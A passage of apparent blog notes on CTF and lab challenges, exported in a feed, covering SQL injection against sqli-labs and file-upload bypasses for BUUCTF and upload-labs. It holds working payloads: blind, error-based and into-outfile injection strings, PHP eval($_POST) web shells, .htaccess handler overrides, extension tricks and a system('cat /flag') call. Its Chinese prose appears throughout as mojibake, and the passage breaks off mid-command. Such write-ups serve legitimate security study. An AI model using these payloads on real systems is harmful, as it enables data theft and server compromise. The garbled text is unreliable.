<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and (select count(column_name) from information_schema.columns where table_name=&#x27;è¡¨å&#x27;)=8--+</span><br><span class="line">æ­£ç¡®åˆ™è¯¥è¡¨ä¸­å­—æ®µçš„æ•°é‡ä¸º8</span><br></pre></td></tr></table></figure>

<p><strong>å­—æ®µçš„é•¿åº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çŒœç¬¬ä¸€ä¸ªå­—æ®µçš„é•¿åº¦</span><br><span class="line">id=  and length(substr((select column_name from information_schema.columns where table_name= &#x27;è¡¨å&#x27; limit 0,1),1))=7--+</span><br><span class="line">æ­£ç¡®åˆ™è¯¥å­—æ®µçš„é•¿åº¦ä¸º7</span><br></pre></td></tr></table></figure>

<p><strong>å­—æ®µçš„åå­—</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and substr((select column_name from information_schema.columns where table_name=è¡¨å limit i,1),n,1)=&#x27;&#x27;--+</span><br><span class="line">iæ˜¯ç¬¬å‡ ä¸ªè¡¨</span><br><span class="line">næ˜¯ç¬¬å‡ ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure>

<h4 id="6-çŒœæ•°æ®"><a href="#6-çŒœæ•°æ®" class="headerlink" title="6.çŒœæ•°æ®"></a>6.çŒœæ•°æ®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and substr((select åˆ—å from åº“å.è¡¨å limit 0,1),1,1)=&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="7-çŒœæ•°æ®åº“çš„åå­—ã€è¡¨çš„åå­—ã€å­—æ®µçš„åå­—å’Œæ•°æ®éƒ½å¯ä»¥ä½¿ç”¨ascii-substr"><a href="#7-çŒœæ•°æ®åº“çš„åå­—ã€è¡¨çš„åå­—ã€å­—æ®µçš„åå­—å’Œæ•°æ®éƒ½å¯ä»¥ä½¿ç”¨ascii-substr" class="headerlink" title="7.çŒœæ•°æ®åº“çš„åå­—ã€è¡¨çš„åå­—ã€å­—æ®µçš„åå­—å’Œæ•°æ®éƒ½å¯ä»¥ä½¿ç”¨ascii(substr())"></a>7.çŒœæ•°æ®åº“çš„åå­—ã€è¡¨çš„åå­—ã€å­—æ®µçš„åå­—å’Œæ•°æ®éƒ½å¯ä»¥ä½¿ç”¨ascii(substr())</h4><h2 id="ä¸‰-æ–‡ä»¶ä¸Šä¼ "><a href="#ä¸‰-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä¸‰.æ–‡ä»¶ä¸Šä¼ "></a>ä¸‰.æ–‡ä»¶ä¸Šä¼ </h2><h4 id="1-ä½¿ç”¨select-â€¦-into-outfileå‡½æ•°"><a href="#1-ä½¿ç”¨select-â€¦-into-outfileå‡½æ•°" class="headerlink" title="1.ä½¿ç”¨select â€¦ into outfileå‡½æ•°"></a>1.ä½¿ç”¨select â€¦ into outfileå‡½æ•°</h4><h4 id="2-çˆ†åº“å"><a href="#2-çˆ†åº“å" class="headerlink" title="2.çˆ†åº“å"></a>2.çˆ†åº“å</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=-1&#x27;))  UNION SELECT user(),version(),database() into outfile &quot;d:\\less7\\database.txt&quot;--+</span><br><span class="line">å°†æ•°æ®åº“åå­˜åœ¨database.txtä¸­</span><br></pre></td></tr></table></figure>

<h4 id="3-çˆ†è¡¨å"><a href="#3-çˆ†è¡¨å" class="headerlink" title="3.çˆ†è¡¨å"></a>3.çˆ†è¡¨å</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;d:\\less7\\tables.txt&quot;--+</span><br></pre></td></tr></table></figure>

<h4 id="4-çˆ†åˆ—å"><a href="#4-çˆ†åˆ—å" class="headerlink" title="4.çˆ†åˆ—å"></a>4.çˆ†åˆ—å</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;d:\\less7\\columns.txt&quot;--+</span><br></pre></td></tr></table></figure>

<h4 id="5-çˆ†å­—æ®µå†…å®¹"><a href="#5-çˆ†å­—æ®µå†…å®¹" class="headerlink" title="5.çˆ†å­—æ®µå†…å®¹"></a>5.çˆ†å­—æ®µå†…å®¹</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7/?id=-1&#x27;))  UNION SELECT user(),version(),group_concat(username,password) from users into outfile &quot;E:\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\user.txt&quot;--+</span><br></pre></td></tr></table></figure>

<h2 id="å››-å»¶æ—¶æ³¨å…¥-ä½¿ç”¨è„šæœ¬"><a href="#å››-å»¶æ—¶æ³¨å…¥-ä½¿ç”¨è„šæœ¬" class="headerlink" title="å››.å»¶æ—¶æ³¨å…¥(ä½¿ç”¨è„šæœ¬)"></a>å››.å»¶æ—¶æ³¨å…¥(ä½¿ç”¨è„šæœ¬)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨if(expr1,expr2,expr3)</span><br><span class="line">å¦‚æœexpr1ä¸ºçœŸå°±æ‰§è¡Œexpr2,å¦åˆ™æ‰§è¡Œexpr3</span><br><span class="line">sleep()å‚æ•°å†™æ•°å­—ï¼Œç”¨äºå°†æ—¶é—´å»¶è¿Ÿ</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(expr1,sleep(2),1)//å¦‚æœexpr1ä¸ºçœŸåˆ™å»¶è¿Ÿ2ç§’ï¼Œä¸ºå‡ç›´æ¥è¾“å‡º1</span><br></pre></td></tr></table></figure>

<p><strong>python</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">datetime.datetime.now()æ˜¯å½“å‰é»˜è®¤çš„æ—¶é—´</span><br><span class="line">time.time()æ˜¯è¿”å›å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³ï¼ˆä»¥ç§’è¡¨ç¤ºçš„æµ®ç‚¹æ•°ï¼‰</span><br></pre></td></tr></table></figure>

<h2 id="äº”-æŠ¥é”™å‹æ³¨å…¥"><a href="#äº”-æŠ¥é”™å‹æ³¨å…¥" class="headerlink" title="äº”.æŠ¥é”™å‹æ³¨å…¥"></a>äº”.æŠ¥é”™å‹æ³¨å…¥</h2><p>åœ¨postä¸­ä½¿ç”¨ä»€ä¹ˆè¯­å¥éƒ½ä¸æŠ¥é”™ï¼Œé‚£å°±ä½¿ç”¨æŠ¥é”™è¯­å¥æ¥æµ‹è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue (XML_document, XPath_string);</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)</span><br><span class="line">è¿”å›å†…å®¹ï¼šè‹¥xpathæ­£ç¡®åˆ™è¿”å›ç›®æ ‡XMLæŸ¥è¯¢çš„ç»“æœï¼Œå¦åˆ™è¿”å›xpathé”™è¯¯å†…å®¹</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value);</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)</span><br><span class="line">ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</span><br><span class="line">è¿”å›å†…å®¹ï¼šè‹¥xpathæ­£ç¡®åˆ™è¿”å›æ›´æ”¹å¯¹è±¡åç§°ï¼Œå¦åˆ™è¿”å›xpathé”™è¯¯å†…å®¹</span><br></pre></td></tr></table></figure>

<p><strong>1.æ•°æ®åº“</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and extractvalue(1,concat(0x7e,(select database())))#</span><br></pre></td></tr></table></figure>

<p><strong>2.è·å–è¡¨å</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and (extractvalue(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x5c)))#</span><br></pre></td></tr></table></figure>

<p><strong>3.è·å–å­—æ®µå</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and (extractvalue(1,concat(0x5c,(select column_name from information_schema.columns where table_name=database() limit 3,1),0x5c)))#</span><br></pre></td></tr></table></figure>

<p><strong>4.è·å–æ•°æ®</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and (extractvalue(1,concat(0x5c,(select åˆ—å from è¡¨å limit 3,1),0x5c)))#</span><br></pre></td></tr></table></figure>

<h2 id="å…­-è¯·æ±‚å¤´æ³¨å…¥"><a href="#å…­-è¯·æ±‚å¤´æ³¨å…¥" class="headerlink" title="å…­.è¯·æ±‚å¤´æ³¨å…¥"></a>å…­.è¯·æ±‚å¤´æ³¨å…¥</h2><h4 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h4><p>1.User-Agentï¼šç®€ç§°UAï¼Œå‘è®¿é—®ç½‘ç«™æä¾›æ‰€ä½¿ç”¨çš„æµè§ˆå™¨ç±»å‹ã€æ“ä½œç³»ç»Ÿã€ç‰ˆæœ¬ã€CPU ç±»å‹ã€æµè§ˆå™¨æ¸²æŸ“å¼•æ“ã€æµè§ˆå™¨è¯­è¨€ã€æµè§ˆå™¨æ’ä»¶ç­‰ä¿¡æ¯çš„æ ‡è¯†</p>
<p>2.Refererï¼šåŒ…å«ä¸€ä¸ªURLï¼Œç”¨æˆ·ä»è¯¥URLä»£è¡¨çš„é¡µé¢å‡ºå‘è®¿é—®å½“å‰è¯·æ±‚çš„é¡µé¢</p>
<p>3.Cookieï¼šè®¾ç½®cookie,è¿™æ˜¯æœ€é‡è¦çš„è¯·æ±‚å¤´ä¿¡æ¯ä¹‹ä¸€</p>
<h2 id="ä¸ƒ-ç»•è¿‡"><a href="#ä¸ƒ-ç»•è¿‡" class="headerlink" title="ä¸ƒ.ç»•è¿‡"></a>ä¸ƒ.ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.æ³¨é‡Šç¬¦å·è¢«è¿‡æ»¤ï¼šä½¿ç”¨or &#x27;a&#x27;=&#x27;bçš„æ–¹å¼æ¥ç»•è¿‡</span><br><span class="line">2.ç©ºæ ¼è¢«è¿‡æ»¤ï¼šä½¿ç”¨%a0ç©ºæ ¼ï¼Œ%a0æ¢è¡Œï¼Œ%09tabé”®ï¼Œ%0cæ¥ç»•è¿‡</span><br><span class="line">3.andå’Œorè¢«ç»•è¿‡ï¼šç”¨&amp;&amp;å’Œ||æ¥ä»£æ›¿</span><br><span class="line">4.unionå’Œselectè¢«ç»•è¿‡ï¼šä½¿ç”¨sElectï¼ŒuniOnç­‰æ¥ä»£æ›¿</span><br><span class="line">5.å¯ä»¥ä½¿ç”¨;%00ä½¿è¯­å¥ç»“æŸ</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.gbk(ä¸€ä¸ªæ±‰å­—ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤º)åŒå­—èŠ‚ç»•è¿‡:</span><br><span class="line">(å¯ä»¥åœ¨ä½¿ç”¨hackbaråœ¨getä¸­ä½¿ç”¨)ä¼šåœ¨&#x27;åä¼šè‡ªå·±æ·»åŠ \ä½¿è¯­å¥å˜æˆ\&#x27;çš„æ³¨å…¥è¯­å¥ä¸­ï¼Œä½¿ç”¨%df&#x27;ï¼Œç»è¿‡phpå¤„ç†åå˜æˆ%df\&#x27;ï¼Œ%df\ç»è¿‡ç¼–ç å˜æˆ%df%5cè¿æ¥å˜ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ ·å°±å¯ä»¥å•å¼•å·é€ƒé€¸</span><br><span class="line">(ç›¸åŒçš„æ–¹æ³•æ— æ³•ç”¨hackbaråœ¨postä¸­ä½¿ç”¨)ä½¿ç”¨hackbarï¼Œä¼šè‡ªåŠ¨å°†%dfçš„%æ¢æˆ%25ï¼Œå˜ä¸º%25dfï¼Œpostæ— æ³•å°†å…¶å†æ¬¡è§£ç ä¸º%ï¼Œéœ€è¦ä½¿ç”¨burpæ¥æ³¨å…¥</span><br></pre></td></tr></table></figure>

<h2 id="å…«-å †å æ³¨å…¥"><a href="#å…«-å †å æ³¨å…¥" class="headerlink" title="å…«.å †å æ³¨å…¥"></a>å…«.å †å æ³¨å…¥</h2><p>1.åŸç†:åœ¨SQLä¸­ä½¿ç”¨;æ¥ä½¿æ¡sqlè¯­å¥ç»“æŸï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€æ¡sqlè¯­å¥ç»“æŸåå†æ„é€ ä¸€ä¸ªsqlè¯­å¥ï¼Œä¾‹å¦‚:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;show databases; </span><br><span class="line">åœ¨ç”¨ä¸€è¡Œè¾“å…¥ï¼Œå¯ä»¥è¿”å›è¿™ä¸¤ä¸ªè¯­å¥çš„æŸ¥è¯¢</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>buuçš„upload</title>
    <url>/2022/12/03/upload%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p>[ACTF2020 æ–°ç”Ÿèµ›]Upload	[GXYCTF2019]BabyUpload	[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢	[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</p>
<span id="more"></span>

<h3 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h3><p>1.åªå…è®¸ä¸Šä¼ å›¾ç‰‡</p>
<p>2.ä¸Šä¼ å«æœ‰æœ¨é©¬çš„.jpgæ–‡ä»¶ç„¶åä½¿ç”¨burpæŠ“åŒ…</p>
<p>3.å°†.jpgä¿®æ”¹ä¸º.phpï¼Œæ”¾åŒ…ç„¶åæ— æ³•è®¿é—®</p>
<p>4.å†å°†.jpgä¿®æ”¹ä¸º.phtmlï¼Œç„¶åæ”¾åŒ…å¯ä»¥ç”¨èšå‰‘è¿æ¥(.phtmlæ˜¯ <strong>PHP 2 ç¨‹åº</strong>çš„æ ‡å‡†æ–‡ä»¶æ‰©å±•å)</p>
<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>1.ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ï¼Œæ˜¾ç¤º<strong>åç¼€åä¸èƒ½æœ‰phï¼</strong>ï¼Œè¿™æ˜¯å¯¹åç¼€åçš„é™åˆ¶</p>
<p>2.ä¸Šä¼ å…¶ä»–ç±»å‹çš„æ–‡ä»¶æ˜¾ç¤º<strong>ä¸Šä¼ ç±»å‹ä¹Ÿå¤ªéœ²éª¨äº†å§ï¼</strong>ï¼Œè¿™æ˜¯å¯¹<code>Content-Type</code>çš„é™åˆ¶ï¼Œä¿®æ”¹ä¸º<code>image/jpeg</code>å³å¯ç»•è¿‡</p>
<p>3.ä¸Šä¼ phpæœ¨é©¬æ˜¾ç¤º<strong>è¯¶ï¼Œåˆ«è’™æˆ‘å•Šï¼Œè¿™æ ‡å¿—æ˜æ˜¾è¿˜æ˜¯phpå•Š</strong>ï¼Œè¿™æ˜¯å¯¹æ–‡ä»¶çš„å†…å®¹åšäº†æ£€æµ‹ï¼Œä¸èƒ½å«æœ‰&lt;?ï¼Œåªè¦phpç‰ˆæœ¬&lt;7ï¼Œå¯ä»¥ä½¿ç”¨<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;mochu7&#39;]);&lt;/script&gt;</code>ç»•è¿‡</p>
<p>4.å¯¹äºæ–‡ä»¶åç¼€é™åˆ¶è¿™ä¸ªä¸Šä¼ .htaccessï¼Œä½†ä¼šæ˜¾ç¤º<strong>ä¸Šä¼ ç±»å‹ä¹Ÿå¤ªéœ²éª¨äº†å§ï¼</strong>ï¼Œä¿®æ”¹<code>Content-Type</code>ï¼Œé¡ºåˆ©ä¸Šä¼ </p>
<p>5.ç„¶åç›´æ¥ä¸Šä¼ æœ‰æœ¨é©¬çš„jpgæ–‡ä»¶ï¼Œæœ€åç”¨èšå‰‘è¿æ¥</p>
<h3 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h3><p>å’Œ[GXYCTF2019]BabyUploadä¸€æ ·</p>
<h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h3><p>1.ä¸Šä¼ å†…å®¹ä¸º<code>&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code>çš„phpæ–‡ä»¶æ˜¾ç¤º**Not image!**ï¼Œé‚£å°±ä¿®æ”¹Content-Typeå¤„ä¸ºimage&#x2F;jpeg</p>
<p>2.ä¿®æ”¹ä»¥åç»§ç»­ä¸Šä¼ å›æ˜¾NOT!php!æ„æ€åº”è¯¥æ˜¯ä¸èƒ½ä¸Šä¼ åç¼€ä¸ºphpæ–‡ä»¶ï¼Œé‚£å°±ä½¿ç”¨.phtmlæ¥ä»£æ›¿.php</p>
<p>3.ä¸Šä¼ .phtmlæ–‡ä»¶åæ˜¾ç¤ºä¸èƒ½åŒ…å«&lt;?ï¼Œæ‰€ä»¥ä½¿ç”¨<code>&lt;script language=&quot;php&quot;&gt;  eval($_POST[&#39;a&#39;]); &lt;/script&gt;</code></p>
<p>4.ä¿®æ”¹äº†Content-Typeï¼Œåˆä½¿ç”¨äº†phtmlï¼Œåˆè·³è¿‡äº†&lt;?çš„è¿‡æ»¤ï¼Œä¸Šä¼ æ–‡ä»¶ååˆæ˜¾ç¤ºäº†<code>å†…å®¹ä¸å…¨æ˜¯å›¾ç‰‡</code>,ä½¿ç”¨å›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—ä¸º<code>GIF89a</code>,ä½¿ç”¨<code>GIF89a</code></p>
<p><code>&lt;script language=&quot;php&quot;&gt;  eval($_POST[&#39;a&#39;]); &lt;/script&gt;</code></p>
<p>5.å‘ç°ä¸Šä¼ æˆåŠŸï¼Œä½¿ç”¨hackbaråœ¨postå¤„ä½¿ç”¨a&#x3D;system(â€˜cat &#x2F;flagâ€™);è·å¾—flag</p>
]]></content>
  </entry>
  <entry>
    <title>upload-labså…³å¡</title>
    <url>/2022/11/19/upload-labs/</url>
    <content><![CDATA[<p>ç®€ä»‹</p>
<span id="more"></span>

<h3 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h3><p>jsç»•è¿‡<br>åªå…è®¸ä¸Šä¼ .jpg|.png|.gifåç¼€çš„æ–‡ä»¶<br>é‚£å°±ä¸Šä¼ .gifçš„æ–‡ä»¶<br>ä½¿ç”¨burpæŠ“åŒ…<br>åœ¨burpé‡Œä¿®æ”¹åç¼€.gifä¸º.phpç„¶åæ‰§è¡Œ</p>
<h3 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h3><p>mimeå¤´æ£€æµ‹(ä¼šè‡ªåŠ¨æ£€æµ‹æ–‡ä»¶ç±»å‹)<br>ä¸Šä¼ .phpåç¼€çš„æ–‡ä»¶<br>ä½¿ç”¨burpæŠ“åŒ…é‡Œé¢çš„Content-Typeæ˜¯æ¥æ ‡è¯†è¯¥æ–‡ä»¶æ˜¯ä¸ªä»€ä¹ˆç±»å‹çš„æ–‡ä»¶ï¼ˆphpè¿˜æ˜¯jpgæˆ–è€…gifç­‰ç­‰)<br>å°†Content-Typeåæ”¹ä¸ºimage&#x2F;jpegè®©ä»£ç ä»¥ä¸ºä¸Šä¼ çš„phpæ–‡ä»¶æ˜¯å¯ä»¥é€šè¿‡çš„æ–‡ä»¶<br>ç„¶åæ”¾åŒ…</p>
<h3 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h3><p>æºä»£ç $deny_ext &#x3D; array(â€˜.aspâ€™,â€™.aspxâ€™,â€™.phpâ€™,â€™.jspâ€™);è¿™ä¸ªæ„æ€æ˜¯.asp .aspx .php .jspçš„æ–‡ä»¶éƒ½ä¸èƒ½ä¸Šä¼ ï¼Œå¦‚æœæ£€æµ‹åˆ°å°±è¿›è¡Œæ‹¦æˆªã€‚<br>ä½¿ç”¨ä¸å¸¸è§çš„åç¼€ï¼Œæ¯”å¦‚.php3 .php2ç­‰ç­‰</p>
<h3 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h3><p>æºä»£ç $deny_ext &#x3D; array(â€œ.phpâ€,â€.php5â€,â€.php4â€,â€.php3â€,â€.php2â€,â€php1â€,â€.htmlâ€,â€.htmâ€,â€.phtmlâ€,â€.phtâ€,â€.pHpâ€,â€.pHp5â€,â€.pHp4â€,â€.pHp3â€,â€.pHp2â€,â€pHp1â€,â€.Htmlâ€,â€.Htmâ€,â€.pHtmlâ€,â€.jspâ€,â€.jspaâ€,â€.jspxâ€,â€.jswâ€,â€.jsvâ€,â€.jspfâ€,â€.jtmlâ€,â€.jSpâ€,â€.jSpxâ€,â€.jSpaâ€,â€.jSwâ€,â€.jSvâ€,â€.jSpfâ€,â€.jHtmlâ€,â€.aspâ€,â€.aspxâ€,â€.asaâ€,â€.asaxâ€,â€.ascxâ€,â€.ashxâ€,â€.asmxâ€,â€.cerâ€,â€.aSpâ€,â€.aSpxâ€,â€.aSaâ€,â€.aSaxâ€,â€.aScxâ€,â€.aShxâ€,â€.aSmxâ€,â€.cErâ€,â€.sWfâ€,â€.swfâ€)<br>è¿™æ¡è¯­å¥å‡ ä¹å°†ä¸å¸¸ç”¨çš„åç¼€éƒ½å·²ç»æ‹¦æˆª<br>æ‰€ä»¥ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè®©ä»–æŠŠä»»ä½•æ–‡ä»¶éƒ½å½“åšâ€.phpâ€å»è¯»å–ï¼Œè¿™å°±æ˜¯.htaccessçš„åŠŸèƒ½<br>å†™å…¥.htacessæ–‡ä»¶ä¸€ä¸‹å†…å®¹<br>&lt;FilesMatch â€œjpgâ€&gt;&#x2F;&#x2F;ä¸ºæŒ‡å®šä¸Šä¼ çš„æ–‡ä»¶åç¼€èµ·ä½œç”¨<br>SetHandler application&#x2F;x-httpd-php&#x2F;&#x2F;æ˜¯è®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨phpè§£æï¼Œé‚£ä¹ˆæ— è®ºä¸Šä¼ ä»»ä½•æ–‡ä»¶ï¼Œåªè¦ç¬¦åˆphpè¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“åšPHPæ‰§è¡Œã€‚ä¸ç¬¦åˆè§„åˆ™åˆ™æŠ¥é”™<br><br>ç„¶åå†ä¸Šä¼ ä¸€ä¸ªjpgåç¼€çš„æ–‡ä»¶å°±å¯ä»¥äº†</p>
<h3 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h3><p>æ–¹æ³•ä¸€(?)<br>é™¤äº†æ‹¦æˆªçš„åç¼€çš„ç¬¬å››å…³ä¸€æ ·åˆæ‹¦æˆªäº†.htaccess<br>ä½†æºä»£ç é‡Œæ²¡æœ‰å¾ªç¯ï¼Œè¿™äº›è¯­å¥åªä¼šæ‰§è¡Œä¸€æ¬¡<br>åœ¨burpé‡Œè¿›è¡Œä¿®æ”¹ä¸ºxx.php. .å†æ”¾åŒ…<br>åªè¦ä¿è¯æœ‰ä¸¤ä¸ªåˆ†å¼€çš„ç‚¹å°±è¡Œäº†æ¼”ç¤ºè¿‡ç¨‹ä¸­æ˜¯æœ€ç®€çš„æ–¹æ³•ï¼Œä¸¤ä¸ªç‚¹æ”¾åœ¨ä¸€èµ·ä¼šè¢«é˜²æŠ¤è§„åˆ™åŒæ—¶åˆ é™¤æ‰<br>ç”±äºWindowsç³»ç»Ÿçš„å‘½åè§„åˆ™ï¼Œæ— è®ºä½ åç¼€æœ‰å¤šå°‘ä¸ªç©ºæ ¼å’Œç‚¹ä»–éƒ½ä¼šç»™ä½ è‡ªåŠ¨åˆ é™¤æ‰<br>æ–¹æ³•äºŒ<br>æºä»£ç é‡Œæ²¡æœ‰äº†è½¬æ¢ä¸ºå°å†™<br>ä¸Šä¼ .phpæ–‡ä»¶å<br>å†burpä¸­æ”¹ä¸º.phP<br>ç›´æ¥æ”¾åŒ…</p>
<h3 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³(?)"></a>ç¬¬å…­å…³(?)</h3><p>æºä»£ç é‡Œæ²¡æœ‰äº†é¦–å°¾å»ç©ºï¼Œå¯ä»¥ä¸Šä¼ .phpæ–‡ä»¶ç„¶åç”¨burpæŠ“åŒ…<br>åœ¨burpä¸­åœ¨.phpååŠ ä¸€ä¸ªç©ºæ ¼ç„¶åå†æ”¾åŒ…</p>
<h3 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h3><p>æºä»£ç é‡Œæ²¡æœ‰äº†åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹<br>ä¸Šä¼ .phpæ–‡ä»¶å<br>å†burpä¸­æ”¹ä¸º.php.<br>ç›´æ¥æ”¾åŒ…</p>
<h3 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h3><p>æºä»£ç ä¸­æ²¡æœ‰äº†å»é™¤å­—ç¬¦ä¸²::$DATA<br>ä¸Šä¼ .phpæ–‡ä»¶å<br>å†burpä¸­æ”¹ä¸º.php::$DATA<br>ç›´æ¥æ”¾åŒ…</p>
<h3 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h3><p>ä¸Šä¼ .phpæ–‡ä»¶<br>ä½¿ç”¨burpæŠ“åŒ…<br>ç„¶ååœ¨burpé‡Œä¿®æ”¹ä¸º.php. .<br>æœ€åæ”¾åŒ…</p>
<h3 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h3><p>ä¸Šä¼ .phpæ–‡ä»¶<br>ä½¿ç”¨burpæŠ“åŒ…<br>ç„¶ååœ¨burpé‡Œä¿®æ”¹ä¸º.pphphp<br>æœ€åæ”¾åŒ…</p>
<h3 id="ç¬¬åä¸€å…³"><a href="#ç¬¬åä¸€å…³" class="headerlink" title="ç¬¬åä¸€å…³(?)"></a>ç¬¬åä¸€å…³(?)</h3><h3 id="ç¬¬åäºŒå…³"><a href="#ç¬¬åäºŒå…³" class="headerlink" title="ç¬¬åäºŒå…³(?)"></a>ç¬¬åäºŒå…³(?)</h3><h3 id="ç¬¬åä¸‰å…³"><a href="#ç¬¬åä¸‰å…³" class="headerlink" title="ç¬¬åä¸‰å…³"></a>ç¬¬åä¸‰å…³</h3><h3 id="ç¬¬åå››å…³"><a href="#ç¬¬åå››å…³" class="headerlink" title="ç¬¬åå››å…³"></a>ç¬¬åå››å…³</h3><h3 id="ç¬¬åäº”å…³"><a href="#ç¬¬åäº”å…³" class="headerlink" title="ç¬¬åäº”å…³"></a>ç¬¬åäº”å…³</h3><p>å°†ä¸€ä¸ª.phpæ–‡ä»¶ä¸ªä¸€ä¸ª.jpgæ–‡ä»¶å’Œæˆä¸€ä¸ª.jpgæ–‡ä»¶<br>åœ¨cmdä¸­ä½¿ç”¨copy &#x2F;b 